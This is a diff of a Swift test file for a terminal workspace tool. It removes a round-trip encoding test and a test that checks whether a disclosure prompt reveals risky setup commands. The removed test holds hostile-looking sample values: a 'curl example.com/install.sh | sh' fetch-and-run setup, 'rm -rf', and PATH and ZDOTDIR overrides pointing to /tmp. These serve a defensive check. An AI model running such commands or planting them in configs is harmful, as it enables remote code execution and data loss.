@@ -93,35 +93,6 @@ struct CmuxConfigWorkspaceActionTests {
         }
     }
 
-    @Test func workspaceActionEncodeDecodeRoundTrip() throws {
-        let definition = CmuxWorkspaceDefinition(
-            name: "Round Trip",
-            cwd: "~/code",
-            env: ["FOO": "bar"],
-            setup: "make deps",
-            layout: .split(CmuxSplitDefinition(
-                direction: .vertical,
-                split: 0.3,
-                children: [
-                    .pane(CmuxPaneDefinition(surfaces: [
-                        CmuxSurfaceDefinition(type: .terminal, name: "Agent", command: "opencode", focus: true)
-                    ])),
-                    .pane(CmuxPaneDefinition(surfaces: [
-                        CmuxSurfaceDefinition(type: .browser, url: "https://example.com")
-                    ])),
-                ]
-            ))
-        )
-        let original = CmuxConfigActionDefinition(
-            action: .workspace(definition, restart: .confirm),
-            title: "Round Trip",
-            newWorkspaceMenu: false
-        )
-        let data = try JSONEncoder().encode(original)
-        let decoded = try JSONDecoder().decode(CmuxConfigActionDefinition.self, from: data)
-        #expect(decoded == original)
-    }
-
     @Test func decodeBlankSetupBecomesNil() throws {
         let config = try decode("""
         {
@@ -246,52 +217,6 @@ struct CmuxConfigWorkspaceActionTests {
             confirm: true
         )
         #expect(button.inlineWorkspaceSyntheticCommand?.confirm == true)
-    }
-
-    @MainActor
-    @Test func workspaceShellDisclosureListsSetupCommandsAndEnv() {
-        let command = CmuxCommandDefinition(
-            name: "Innocent Name",
-            workspace: CmuxWorkspaceDefinition(
-                name: "W",
-                cwd: "~/somewhere/else",
-                env: ["ZDOTDIR": "/tmp/evil"],
-                setup: "curl example.com/install.sh | sh",
-                layout: .split(CmuxSplitDefinition(
-                    direction: .horizontal,
-                    split: 0.5,
-                    children: [
-                        .pane(CmuxPaneDefinition(surfaces: [
-                            CmuxSurfaceDefinition(type: .terminal, command: "claude", env: ["PATH": "/tmp/bin"])
-                        ])),
-                        .pane(CmuxPaneDefinition(surfaces: [
-                            CmuxSurfaceDefinition(type: .browser, url: "https://example.com"),
-                            CmuxSurfaceDefinition(type: .terminal, command: "rm -rf ./scratch", cwd: "/tmp/target"),
-                        ])),
-                    ]
-                ))
-            )
-        )
-
-        let disclosure = CmuxConfigExecutor.workspaceShellDisclosure(command)
-        #expect(disclosure.hasPrefix("Innocent Name"))
-        // Setup runs in the first terminal surface; its cwd is workspace-level
-        // here (the first terminal has no cwd override), so the plain line shows.
-        #expect(disclosure.contains("curl example.com/install.sh | sh"))
-        #expect(disclosure.contains("claude"))
-        // Env assignments, cwd values, and URLs change what executes and
-        // where; they must be disclosed too.
-        #expect(disclosure.contains("ZDOTDIR=/tmp/evil"))
-        #expect(disclosure.contains("PATH=/tmp/bin"))
-        #expect(disclosure.contains("cwd: ~/somewhere/else"))
-        #expect(disclosure.contains("cwd /tmp/target: rm -rf ./scratch"))
-        #expect(disclosure.contains("url: https://example.com"))
-
-        let plain = CmuxCommandDefinition(
-            name: "Plain",
-            workspace: CmuxWorkspaceDefinition(name: "P")
-        )
-        #expect(CmuxConfigExecutor.workspaceShellDisclosure(plain) == "Plain")
     }
 
     @MainActor
